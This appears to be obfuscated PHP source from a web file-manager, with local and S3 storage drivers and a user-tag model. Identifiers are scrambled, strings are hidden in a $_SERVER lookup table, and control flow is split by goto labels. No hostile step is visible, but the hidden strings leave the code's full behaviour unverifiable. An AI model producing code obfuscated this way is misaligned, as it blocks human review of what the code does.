protected function infoParse($¤ô”È£, $óŸ‚ö…™ = false) { $•Õ¤îÊ¯ =& $_SERVER[µÅ˜º…æ]; $«üı“Óõ = $this->pathParse[$•Õ¤îÊ¯[576]][$•Õ¤îÊ¯[583]] . $this->pathParse[$•Õ¤îÊ¯[1357]]; if ($óŸ‚ö…™) { $ÀæãÔÎ = IO::infoWithChildren($«üı“Óõ); } else { $ÀæãÔÎ = IO::info($«üı“Óõ); } $ÆÙ¯°›“ = $this->pathParse[$•Õ¤îÊ¯[576]]; return Action($•Õ¤îÊ¯[1541])->_shareItemeParse($ÀæãÔÎ, $ÆÙ¯°›“); } public function listAll($Ú‚…¦Ä½) { $Ğ¦¨°”ï =& $_SERVER[µÅ˜º…æ]; $ü«›å¡î = IO::listAll($Ú‚…¦Ä½); $Ô•ÕüŒ£ = rtrim($this->pathParse[$Ğ¦¨°”ï[576]][$Ğ¦¨°”ï[583]], $Ğ¦¨°”ï[8]); foreach ($ü«›å¡î as &$Ú¬ØµùÓ) { $Ú¬ØµùÓ[$Ğ¦¨°”ï[87]] = $this->pathDriver . $Ğ¦¨°”ï[8] . ltrim(substr($Ú¬ØµùÓ[$Ğ¦¨°”ï[87]], strlen($Ô•ÕüŒ£)), $Ğ¦¨°”ï[8]); } unset($Ú¬ØµùÓ); return $ü«›å¡î; } public function listAllSimple($ê™îàø¨, $‚ŒÈçÑ = false) { $Â·èûÌ =& $_SERVER[µÅ˜º…æ]; $ËµÅ½¶ = $this->listAll($ê™îàø¨); $³—¬ãŞï = $this->pathParse[$Â·èûÌ[510]]; if (trim($³—¬ãŞï, $Â·èûÌ[8]) == trim(get_path_father($³—¬ãŞï), $Â·èûÌ[8])) { $‚ŒÈçÑ = !0; } return IO::init($Â·èûÌ[12])->listAllSimpleMake($ËµÅ½¶, $³—¬ãŞï, $‚ŒÈçÑ); } public function getPathOuter($ ü³Ê•ã) { $ôê€ğÔ¹ =& $_SERVER[µÅ˜º…æ]; $Š”ß©óò = KodIO::parse($ ü³Ê•ã); if ($Š”ß©óò[$ôê€ğÔ¹[33]] == KodIO::KOD_SHARE_ITEM) { return $Š”ß©óò[$ôê€ğÔ¹[87]]; } $¸ñş¸ò» = KodIO::clear($ ü³Ê•ã); $ŞÈõ‘¼Á = KodIO::clear($this->pathParse[$ôê€ğÔ¹[576]][$ôê€ğÔ¹[583]]); $ñÑœ‚şÛ = substr($¸ñş¸ò», strlen($ŞÈõ‘¼Á)); if (substr($¸ñş¸ò», 0, strlen($ŞÈõ‘¼Á)) != $ŞÈõ‘¼Á) { return !1; } return $this->pathParse[$ôê€ğÔ¹[1358]] . $ôê€ğÔ¹[8] . ltrim($ñÑœ‚şÛ, $ôê€ğÔ¹[8]); } public function getType() { $¡Šî™ãŸ =& $_SERVER[µÅ˜º…æ]; $Ø âû¥ = str_replace($¡Šî™ãŸ[77], $¡Šî™ãŸ[12], get_class($this)); return strtolower($Ø âû¥); } public function isOsDriver($¢Ğ‡¾Ùô) { return IO::isOsDriver($¢Ğ‡¾Ùô); } public function info($™õ²ïª÷) { return $this->infoParse($™õ²ïª÷); } public function infoAuth($¿õ„ÎÅĞ) { return $this->infoParse($¿õ„ÎÅĞ); } public function infoWithChildren($ô¸Öí›Ø) { return $this->infoParse($ô¸Öí›Ø, !0); } public function infoFull($ßíÑÒıš) { return $this->infoParse($ßíÑÒıš); } } goto Fˆ–İˆóô; BÂË‹„èé§: class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($¯Àƒæõ”) { if (substr($¯Àƒæõ”, 0, 2) == $_SERVER[µÅ˜º…æ][1524]) { $¯Àƒæõ” = BASIC_PATH . substr($¯Àƒæõ”, 2); } return $¯Àƒæõ”; } public function iconvApp($•ùêÎ¨) { $íïé¾•Ö =& $_SERVER[µÅ˜º…æ]; global $config; return $this->iconvTo($•ùêÎ¨, $config[$íïé¾•Ö[1648]], $config[$íïé¾•Ö[1647]]); } public function iconvSystem($”€ÔíåÆ) { $öóÚØÇ¹ =& $_SERVER[µÅ˜º…æ]; global $config; return $this->iconvTo($”€ÔíåÆ, $config[$öóÚØÇ¹[1647]], $config[$öóÚØÇ¹[1648]]); } public function getPathOuter($÷ŞìÛ·¹) { $Ğ¹ùŒ™ =& $_SERVER[µÅ˜º…æ]; $›…šŠ¯Ö = $this->iconvApp($this->pathBase); $÷ŞìÛ·¹ = $this->iconvApp($÷ŞìÛ·¹); if (substr($›…šŠ¯Ö, 0, 2) == $Ğ¹ùŒ™[1524]) { $›…šŠ¯Ö = BASIC_PATH . substr($›…šŠ¯Ö, 2); } if (substr($÷ŞìÛ·¹, 0, 2) == $Ğ¹ùŒ™[1524]) { $÷ŞìÛ·¹ = BASIC_PATH . substr($÷ŞìÛ·¹, 2); } $›…šŠ¯Ö = KodIO::clear($›…šŠ¯Ö); $÷ŞìÛ·¹ = KodIO::clear($÷ŞìÛ·¹); $÷ŞìÛ·¹ = substr($÷ŞìÛ·¹, strlen($›…šŠ¯Ö)); if (empty($this->pathDriver)) { return $÷ŞìÛ·¹; } return $this->pathDriver . $Ğ¹ùŒ™[8] . ltrim($÷ŞìÛ·¹, $Ğ¹ùŒ™[8]); } public function mkfile($Ò¯æéé, $Á£ÁĞ…À = '', $î«ËÌÇç = REPEAT_RENAME) { $Ò¯æéé = $this->iconvSystem($Ò¯æéé); @touch($Ò¯æéé); if ($Á£ÁĞ…À) { file_put_contents($Ò¯æéé, $Á£ÁĞ…À); } @chmod($Ò¯æéé, $this->pathAuth); if (is_file($Ò¯æéé)) { return $this->getPathOuter($Ò¯æéé); } $this->writeLog(__FUNCTION__ . $_SERVER[µÅ˜º…æ][1659], !0); return !1; } public function mkdir($ô¦©¿, $¸µşÒ­Î = REPEAT_SKIP) { $ô¦©¿ = $this->iconvSystem($ô¦©¿); if (is_dir($ô¦©¿)) { return $this->getPathOuter($ô¦©¿); } @mkdir($ô¦©¿, $this->pathAuth, !0); @chmod($ô¦©¿, $this->pathAuth); if (is_dir($ô¦©¿)) { return $this->getPathOuter($ô¦©¿); } $this->writeLog(__FUNCTION__ . $_SERVER[µÅ˜º…æ][1659], !0); return !1; } public function copyFile($õ”œù¡, $´ö²Å§š) { $this->mkdir($this->pathFather($´ö²Å§š)); $õ”œù¡ = $this->iconvSystem($õ”œù¡); $´ö²Å§š = $this->iconvSystem($´ö²Å§š); $ê…ëùãŞ = copy_64($õ”œù¡, $´ö²Å§š); @chmod($´ö²Å§š, $this->pathAuth); if ($ê…ëùãŞ) { return $this->getPathOuter($´ö²Å§š); } $this->writeLog(__FUNCTION__ . $_SERVER[µÅ˜º…æ][1659], !0); return !1; } public function moveFile($›ãŞèÆ¦, $Úò²¿îÊ) { $this->mkdir($this->pathFather($Úò²¿îÊ)); $›ãŞèÆ¦ = $this->iconvSystem($›ãŞèÆ¦); $Úò²¿îÊ = $this->iconvSystem($Úò²¿îÊ); $´åËõÄà = intval(@rename($›ãŞèÆ¦, $Úò²¿îÊ)); if (!$´åËõÄà) { if ($´åËõÄà = intval(@copy_64($›ãŞèÆ¦, $Úò²¿îÊ))) { @unlink($›ãŞèÆ¦); } } @chmod($Úò²¿îÊ, $this->pathAuth); if ($´åËõÄà) { return $this->getPathOuter($Úò²¿îÊ); } $this->writeLog(__FUNCTION__ . $_SERVER[µÅ˜º…æ][1659], !0); return !1; } public function movePath($˜â¸€“œ, $ààòÄğá, $¢•’¸õ© = false) { $àöîĞ×¿ =& $_SERVER[µÅ˜º…æ]; $˜â¸€“œ = $this->iconvSystem($˜â¸€“œ); $ààòÄğá = $this->iconvSystem($ààòÄğá); $é¯ßÒ©Ë = rtrim($ààòÄğá, $àöîĞ×¿[8]) . $àöîĞ×¿[8] . ($¢•’¸õ© ? $¢•’¸õ© : get_path_this($˜â¸€“œ)); if (file_exists($é¯ßÒ©Ë)) { return !1; } $ôû’±ôØ = intval(@rename($˜â¸€“œ, $é¯ßÒ©Ë)); $ôû’±ôØ = file_exists($é¯ßÒ©Ë); if ($ôû’±ôØ) { return $this->getPathOuter($é¯ßÒ©Ë); } $this->writeLog(__FUNCTION__ . $àöîĞ×¿[1659], !0); return !1; } public function delFile($§È›Û„Ã) { $§È›Û„Ã = $this->iconvSystem($§È›Û„Ã); if (!@unlink($§È›Û„Ã)) { @chmod($§È›Û„Ã, $this->pathAuth); if (@unlink($§È›Û„Ã)) { return !0; } $this->writeLog(__FUNCTION__ . $_SERVER[µÅ˜º…æ][1659], !0); return !1; } return !0; } public function delFolder($Û¢ùşá“) { $ŒƒûÇÌè =& $_SERVER[µÅ˜º…æ]; $Û¢ùşá“ = $this->iconvSystem($Û¢ùşá“); if (!is_dir($Û¢ùşá“)) { return !0; } if (!($•‹…¢¹ = opendir($Û¢ùşá“))) { return !1; } while (($èŒ»¥î“ = readdir($•‹…¢¹)) !== !1) { if ($èŒ»¥î“ == $ŒƒûÇÌè[10] || $èŒ»¥î“ == $ŒƒûÇÌè[1469]) { continue; } $Üî¯’ = $Û¢ùşá“ . $ŒƒûÇÌè[8] . $èŒ»¥î“; if (is_file($Üî¯’) || is_link($Üî¯’)) { if (!unlink($Üî¯’)) { chmod($Üî¯’, $this->pathAuth); if (!unlink($Üî¯’)) { return !1; } } } else { if (is_dir($Üî¯’)) { chmod($Üî¯’, $this->pathAuth); $Üî¯’ = $this->iconvApp($Üî¯’); if (!$this->delFolder($Üî¯’)) { return !1; } } } } closedir($•‹…¢¹); return rmdir($Û¢ùşá“); } public function rename($€¯şá—­, $¬†â¼¸ş) { $Â¢óóÙ¿ =& $_SERVER[µÅ˜º…æ]; $©áâùÂ» = $this->fileNameAuto($this->pathFather($€¯şá—­), $¬†â¼¸ş); $©áâùÂ» = $this->iconvSystem($©áâùÂ»); $€¯şá—­ = $this->iconvSystem($€¯şá—­); $Éé·† = $this->pathFather($€¯şá—­); $ğÅø£ = rtrim($Éé·†, $Â¢óóÙ¿[8]) . $Â¢óóÙ¿[8] . $©áâùÂ»; $ÓùÑğíÏ = @rename($€¯şá—­, $ğÅø£); $ğÅø£ = $this->iconvApp($ğÅø£); if ($ÓùÑğíÏ) { return $this->getPathOuter($ğÅø£); } $this->writeLog(__FUNCTION__ . $Â¢óóÙ¿[1659], !0); return !1; } public function size($ºëş†¥ˆ) { $ºëş†¥ˆ = $this->iconvSystem($ºëş†¥ˆ); return filesize_64($ºëş†¥ˆ); } public function info($Ü“Ÿá±—) { $Ü“Ÿá±— = $this->iconvSystem($Ü“Ÿá±—); if ($this->isFolder($Ü“Ÿá±—)) { return $this->folderInfo($Ü“Ÿá±—); } else { if ($this->isFile($Ü“Ÿá±—)) { return $this->fileInfo($Ü“Ÿá±—); } } return !1; } protected function infoChildren($èÊÑÊÔ, &$ãÕóºïØ, $ªåªı = true) { $±İó•±§ =& $_SERVER[µÅ˜º…æ]; check_abort_echo(); $èÊÑÊÔ = rtrim($èÊÑÊÔ, $±İó•±§[8]) . $±İó•±§[8]; if ($ªåªı) { $èÊÑÊÔ = $this->iconvSystem($èÊÑÊÔ); } if (!($äÕÌä“í = @opendir($èÊÑÊÔ))) { return; } while (($ÒÓÇªäŸ = readdir($äÕÌä“í)) !== !1) { if ($ÒÓÇªäŸ == $±İó•±§[10] || $ÒÓÇªäŸ == $±İó•±§[1469]) { continue; } $çĞ“°’ä = $èÊÑÊÔ . $ÒÓÇªäŸ; if (is_file($çĞ“°’ä) || is_link($çĞ“°’ä)) { $ãÕóºïØ[$±İó•±§[80]]++; $ãÕóºïØ[$±İó•±§[79]] += filesize_64($çĞ“°’ä); } else { if (is_dir($çĞ“°’ä)) { $ãÕóºïØ[$±İó•±§[81]]++; $this->infoChildren($çĞ“°’ä, $ãÕóºïØ, !1); } } } closedir($äÕÌä“í); } private function folderInfo($ãÉõÂ®„, $’óË¶Á¿ = false) { $ÌËØ·¾¹ =& $_SERVER[µÅ˜º…æ]; $ãÉõÂ®„ = rtrim($ãÉõÂ®„, $ÌËØ·¾¹[8]) . $ÌËØ·¾¹[8]; $×åÊÌ¨ = $this->iconvApp($this->pathThis($ãÉõÂ®„)); if ($’óË¶Á¿) { return array($ÌËØ·¾¹[32] => $×åÊÌ¨, $ÌËØ·¾¹[87] => $this->getPathOuter($ãÉõÂ®„), $ÌËØ·¾¹[33] => $ÌËØ·¾¹[78]); } $ğƒîƒ•ô = array($ÌËØ·¾¹[32] => $×åÊÌ¨, $ÌËØ·¾¹[87] => $this->getPathOuter($ãÉõÂ®„), $ÌËØ·¾¹[33] => $ÌËØ·¾¹[78], $ÌËØ·¾¹[231] => @filectime($ãÉõÂ®„), $ÌËØ·¾¹[88] => @filemtime($ãÉõÂ®„), $ÌËØ·¾¹[1663] => @fileatime($ãÉõÂ®„), $ÌËØ·¾¹[1664] => is_readable($ãÉõÂ®„), $ÌËØ·¾¹[1665] => is_writable($ãÉõÂ®„), $ÌËØ·¾¹[1666] => get_mode($ãÉõÂ®„)); return $ğƒîƒ•ô; } private function fileInfo($ ƒÇÙØ, $¯¾˜½¥ = false) { $¡ı·ù‚í =& $_SERVER[µÅ˜º…æ]; $ëÄÆŒîÑ = $this->iconvApp($this->pathThis($ ƒÇÙØ)); if ($¯¾˜½¥) { return array($¡ı·ù‚í[32] => $ëÄÆŒîÑ, $¡ı·ù‚í[87] => $this->getPathOuter($ ƒÇÙØ), $¡ı·ù‚í[33] => $¡ı·ù‚í[230], $¡ı·ù‚í[79] => $this->size($ ƒÇÙØ), $¡ı·ù‚í[166] => $this->ext($ëÄÆŒîÑ)); } $‚ßı¸«Ã = array($¡ı·ù‚í[32] => $ëÄÆŒîÑ, $¡ı·ù‚í[87] => $this->getPathOuter($ ƒÇÙØ), $¡ı·ù‚í[33] => $¡ı·ù‚í[230], $¡ı·ù‚í[231] => @filectime($ ƒÇÙØ), $¡ı·ù‚í[88] => @filemtime($ ƒÇÙØ), $¡ı·ù‚í[1663] => @fileatime($ ƒÇÙØ), $¡ı·ù‚í[79] => $this->size($ ƒÇÙØ), $¡ı·ù‚í[166] => $this->ext($ëÄÆŒîÑ), $¡ı·ù‚í[1664] => is_readable($ ƒÇÙØ), $¡ı·ù‚í[1665] => is_writable($ ƒÇÙØ), $¡ı·ù‚í[1666] => get_mode($ ƒÇÙØ)); return $‚ßı¸«Ã; } public function exist($¿“³Áœš) { $¿“³Áœš = $this->iconvSystem($¿“³Áœš); return @file_exists($¿“³Áœš); } public function isFile($£í±»»Í) { $£í±»»Í = $this->iconvSystem($£í±»»Í); return @is_file($£í±»»Í); } public function isFolder($•ôˆ—™) { $•ôˆ—™ = $this->iconvSystem($•ôˆ—™); return @is_dir($•ôˆ—™); } public function listPath($ñùâ‚é¼, $ğé§‹ş = false) { $ÈôŸêï÷ =& $_SERVER[µÅ˜º…æ]; $ñùâ‚é¼ = $this->iconvSystem($ñùâ‚é¼); $ñùâ‚é¼ = rtrim($ñùâ‚é¼, $ÈôŸêï÷[8]) . $ÈôŸêï÷[8]; $ƒ¸ú‘ñú = array($ÈôŸêï÷[85] => array(), $ÈôŸêï÷[86] => array()); if (!($œ‡é = @opendir($ñùâ‚é¼))) { return $ƒ¸ú‘ñú; } while (($àÏŠØÏ¨ = readdir($œ‡é)) !== !1) { if ($àÏŠØÏ¨ == $ÈôŸêï÷[10] || $àÏŠØÏ¨ == $ÈôŸêï÷[1469]) { continue; } $à´³ì©å = $ñùâ‚é¼ . $àÏŠØÏ¨; if (is_file($à´³ì©å)) { $ƒ¸ú‘ñú[$ÈôŸêï÷[86]][] = $this->fileInfo($à´³ì©å, $ğé§‹ş); } else { $ƒ¸ú‘ñú[$ÈôŸêï÷[85]][] = $this->folderInfo($à´³ì©å, $ğé§‹ş); } } closedir($œ‡é); return $ƒ¸ú‘ñú; } public function listAll($çÒ¸òâ§, &$Ø¯Ú¹í” = array()) { $ğööĞ =& $_SERVER[µÅ˜º…æ]; $çÒ¸òâ§ = $this->iconvSystem($çÒ¸òâ§); $çÒ¸òâ§ = rtrim($çÒ¸òâ§, $ğööĞ[8]) . $ğööĞ[8]; if (!($Á¢ûğ×© = @opendir($çÒ¸òâ§))) { return $Ø¯Ú¹í”; } while (($Ãšî¯ÄÌ = readdir($Á¢ûğ×©)) !== !1) { if ($Ãšî¯ÄÌ == $ğööĞ[10] || $Ãšî¯ÄÌ == $ğööĞ[1469]) { continue; } $ÉÜ¡Íø = $çÒ¸òâ§ . $Ãšî¯ÄÌ; $ŞàÙé“¤ = is_dir($ÉÜ¡Íø) && !is_link($ÉÜ¡Íø) ? 1 : 0; $ÉÜ¡Íø = $ŞàÙé“¤ ? $ÉÜ¡Íø . $ğööĞ[8] : $ÉÜ¡Íø; $Ø¯Ú¹í”[] = array($ğööĞ[87] => $this->getPathOuter($ÉÜ¡Íø), $ğööĞ[78] => $ŞàÙé“¤, $ğööĞ[88] => intval(@filemtime($ÉÜ¡Íø)), $ğööĞ[79] => $ŞàÙé“¤ ? 0 : intval($this->size($ÉÜ¡Íø))); if ($ŞàÙé“¤) { $this->listAll($ÉÜ¡Íø, $Ø¯Ú¹í”); } } closedir($Á¢ûğ×©); return $Ø¯Ú¹í”; } public function has($„”€ÜÙÉ, $–îË­‘ = false, $²ú€İö = true) { $ûë×–•¾ =& $_SERVER[µÅ˜º…æ]; $„”€ÜÙÉ = $this->iconvSystem($„”€ÜÙÉ); $„”€ÜÙÉ = rtrim($„”€ÜÙÉ, $ûë×–•¾[8]) . $ûë×–•¾[8]; if (!($Ë•ÌğÔ = @opendir($„”€ÜÙÉ))) { return !1; } $ÏÃ™ˆ›§ = 0; $›¸‘öÆá = 0; $ş•»‚·Ö = 0; while (($Ø¢Ì°íç = readdir($Ë•ÌğÔ)) !== !1) { if ($Ø¢Ì°íç == $ûë×–•¾[10] || $Ø¢Ì°íç == $ûë×–•¾[1469]) { continue; } $ƒù¯¬±õ = $„”€ÜÙÉ . $Ø¢Ì°íç; if ($–îË­‘) { $ş•»‚·Ö++; if (@is_file($ƒù¯¬±õ)) { $ÏÃ™ˆ›§++; } else { $›¸‘öÆá++; } if ($ş•»‚·Ö > 10000) { break; } continue; } if ($²ú€İö) { if (@is_file($ƒù¯¬±õ)) { return !0; } } else { if (@is_dir($ƒù¯¬±õ . $ûë×–•¾[8])) { return !0; } } } closedir($Ë•ÌğÔ); if ($–îË­‘) { return array($ûë×–•¾[239] => $ÏÃ™ˆ›§, $ûë×–•¾[240] => $›¸‘öÆá); } return !1; } public function hashSimple($õÉÍóŒ) { $Ùãêä =& $_SERVER[µÅ˜º…æ]; if (!$õÉÍóŒ) { return md5($Ùãêä[12]); } $õÉÍóŒ = $this->iconvSystem($õÉÍóŒ); $¢õ·ĞÉÑ = $this->size($õÉÍóŒ); $ÖÀíäÍâ = 200; $àïÖŠ¹Ê = 50; if ($¢õ·ĞÉÑ <= $ÖÀíäÍâ * $àïÖŠ¹Ê) { return $this->hashMd5($õÉÍóŒ) . $¢õ·ĞÉÑ; } $¸‘—½¸‹ = $Ùãêä[12]; $åñ¿Í€ò = intval($¢õ·ĞÉÑ / $àïÖŠ¹Ê); $°ÊÜÜÓ = fopen($õÉÍóŒ, $Ùãêä[1667]); if (!$°ÊÜÜÓ) { return $¸‘—½¸‹; } for ($âØ­¾‚ = 0; $âØ­¾‚ < $àïÖŠ¹Ê; $âØ­¾‚++) { fseek_64($°ÊÜÜÓ, $åñ¿Í€ò * $âØ­¾‚); $¸‘—½¸‹ .= fread($°ÊÜÜÓ, $ÖÀíäÍâ); } fseek_64($°ÊÜÜÓ, $¢õ·ĞÉÑ - $ÖÀíäÍâ); $¸‘—½¸‹ .= fread($°ÊÜÜÓ, $ÖÀíäÍâ); fclose($°ÊÜÜÓ); return md5($¸‘—½¸‹) . $¢õ·ĞÉÑ; } public function getContent($­“’å—Ø) { $­“’å—Ø = $this->iconvSystem($­“’å—Ø); return file_get_contents($­“’å—Ø); } public function setContent($Ç¢àÚ×, $§ÑÍÀœå = '') { $Ç¢àÚ× = $this->iconvSystem($Ç¢àÚ×); $ªç•”‘§ = @file_put_contents($Ç¢àÚ×, $§ÑÍÀœå, LOCK_EX); if (!$ªç•”‘§) { $this->writeLog(__FUNCTION__ . $_SERVER[µÅ˜º…æ][1659], !0); } clearstatcache(); @chmod($Ç¢àÚ×, $this->pathAuth); return $ªç•”‘§ === !1 ? !1 : !0; } public function fileSubstr($°ª¯ âÛ, $ äÙÓë¥ = 0, $ò®œ¼Èô = false) { $Şİ•ı©È =& $_SERVER[µÅ˜º…æ]; $°ª¯ âÛ = $this->iconvSystem($°ª¯ âÛ); if ($ò®œ¼Èô === !1) { $ò®œ¼Èô = $this->size($°ª¯ âÛ); } if ($ò®œ¼Èô <= 0) { return $Şİ•ı©È[12]; } $öÅ–¾›® = fopen($°ª¯ âÛ, $Şİ•ı©È[1667]); if (!$öÅ–¾›®) { return !1; } fseek_64($öÅ–¾›®, $ äÙÓë¥); $Î…®†¼ = fread($öÅ–¾›®, $ò®œ¼Èô); fclose($öÅ–¾›®); if (!$Î…®†¼) { $this->writeLog(__FUNCTION__ . $Şİ•ı©È[1659], !0); } return $Î…®†¼; } public function upload($¼Äıæ³ , $§¶’¸å–, $“¦‰¹Ò = false, $ô…§ç»Õ = REPEAT_REPLACE) { if (!$§¶’¸å– || !@file_exists($§¶’¸å–)) { return !1; } if ($“¦‰¹Ò) { return $this->moveFile($§¶’¸å–, $¼Äıæ³ ); } return $this->copyFile($§¶’¸å–, $¼Äıæ³ ); } public function setModifyTime($©é¤ğ½, $˜Êé¤ı· = '') { @touch($©é¤ğ½, intval($˜Êé¤ı·)); } public function download($Åä”üã, $‚Î•À†) { return $this->iconvSystem($Åä”üã); } } class PathDriverOBS extends PathDriverBaseS3 { public function __construct($È©¶ü†«) { parent::__construct($È©¶ü†«); $this->setSignVersion($_SERVER[µÅ˜º…æ][247]); } public function fileOutImage($º‘ï«, $¨Ò»èÂê = 250) { $ªÛáåë° =& $_SERVER[µÅ˜º…æ]; if ($this->size($º‘ï«) > 1024 * 1024 * 25) { return $this->fileOutImageServer($º‘ï«, $¨Ò»èÂê); } $âÍê…Ä¤ = array($ªÛáåë°[1668] => $ªÛáåë°[1669] . $¨Ò»èÂê . $ªÛáåë°[1670]); $õ¬š–ï = $this->link($º‘ï«, $âÍê…Ä¤); $this->fileOutLink($õ¬š–ï); } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($óòóú³) { parent::__construct($óòóú³); $this->setSignVersion($_SERVER[µÅ˜º…æ][247]); } public function uploadFormData($è¤¬Øğ, $–á°ú€„ = 3600) { return $this->uploadFormDataV2($è¤¬Øğ, $–á°ú€„); } } goto f†»»É––™; aÌ”½ƒßèŸ: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\x73\x65\x72\137\x66\x61\x76"; protected function cacheFunctionAlias($³èÉ¢œ) { $Ü™ùÍù =& $_SERVER[µÅ˜º…æ]; return array($Ü™ùÍù[2295] => array($Ü™ùÍù[2722] . USER_ID, $Ü™ùÍù[2296])); } protected function ___listData() { $œèØÎ§Ù =& $_SERVER[µÅ˜º…æ]; $Ğ¯ÂŠƒ = array($œèØÎ§Ù[1967] => USER_ID, $œèØÎ§Ù[573] => array($œèØÎ§Ù[2299], 0)); $ÔÙ¬«¾ƒ = $œèØÎ§Ù[2723]; $š¸„Úƒé = $this->field($ÔÙ¬«¾ƒ)->where($Ğ¯ÂŠƒ)->order($œèØÎ§Ù[2301])->select(); return $š¸„Úƒé ? $š¸„Úƒé : array(); } protected function addToTag($ĞõË³‡Ú, $ëæö…„÷) { $ˆÂ¬ı‘à =& $_SERVER[µÅ˜º…æ]; if (!Model($ˆÂ¬ı‘à[2450])->listData($ëæö…„÷)) { return !1; } if (is_numeric($ĞõË³‡Ú)) { $ìƒÂä­ = Model($ˆÂ¬ı‘à[932])->pathInfo($ĞõË³‡Ú); if (!$ìƒÂä­) { return !1; } } else { $ìƒÂä­ = IO::infoSimple($ĞõË³‡Ú); if (!$ìƒÂä­) { return !1; } $š—‹Ö™ƒ = $ìƒÂä­[$ˆÂ¬ı‘à[32]]; $½¹ìïŸ¤ = $ìƒÂä­[$ˆÂ¬ı‘à[33]]; if (isset($ìƒÂä­[$ˆÂ¬ı‘à[500]])) { $½¹ìïŸ¤ = $ìƒÂä­[$ˆÂ¬ı‘à[500]] == $ˆÂ¬ı‘à[91] ? $ˆÂ¬ı‘à[78] : $ˆÂ¬ı‘à[230]; } } $ÀŸÏİêì = array($ˆÂ¬ı‘à[1967] => USER_ID, $ˆÂ¬ı‘à[573] => $ëæö…„÷, $ˆÂ¬ı‘à[510] => $ĞõË³‡Ú, $ˆÂ¬ı‘à[511] => $½¹ìïŸ¤ ? $½¹ìïŸ¤ : $ˆÂ¬ı‘à[505], $ˆÂ¬ı‘à[509] => $š—‹Ö™ƒ ? $š—‹Ö™ƒ : $ˆÂ¬ı‘à[12], $ˆÂ¬ı‘à[2185] => 0); if ($this->where($ÀŸÏİêì)->find()) { return !1; } return $this->add($ÀŸÏİêì); } protected function removeFromTag($¯˜ş§—, $¦«åÃì¹) { $‹ò«µÙØ =& $_SERVER[µÅ˜º…æ]; if (!Model($‹ò«µÙØ[2450])->listData($¦«åÃì¹)) { return !1; } if (is_array($¯˜ş§—)) { $¯˜ş§— = array($‹ò«µÙØ[7], $¯˜ş§—); } $—¡¤õ¯¬ = array($‹ò«µÙØ[1967] => USER_ID, $‹ò«µÙØ[573] => $¦«åÃì¹, $‹ò«µÙØ[510] => $¯˜ş§—); return $this->where($—¡¤õ¯¬)->delete(); } protected function removeByTag($äÂİŞèô) { $¹¯óÂ˜ =& $_SERVER[µÅ˜º…æ]; if (!$äÂİŞèô) { return !1; } $—ÄºÚõĞ = array($¹¯óÂ˜[1967] => USER_ID, $¹¯óÂ˜[573] => $äÂİŞèô); return $this->where($—ÄºÚõĞ)->delete(); } protected function removeBySource($˜Ï¼˜à´) { $¼¦°éìÙ =& $_SERVER[µÅ˜º…æ]; if (is_array($˜Ï¼˜à´)) { $˜Ï¼˜à´ = array($¼¦°éìÙ[7], $˜Ï¼˜à´); } $¶ÀÖ¶µ = array($¼¦°éìÙ[1967] => USER_ID, $¼¦°éìÙ[573] => array($¼¦°éìÙ[1183], 0), $¼¦°éìÙ[510] => $˜Ï¼˜à´); return $this->where($¶ÀÖ¶µ)->delete(); } }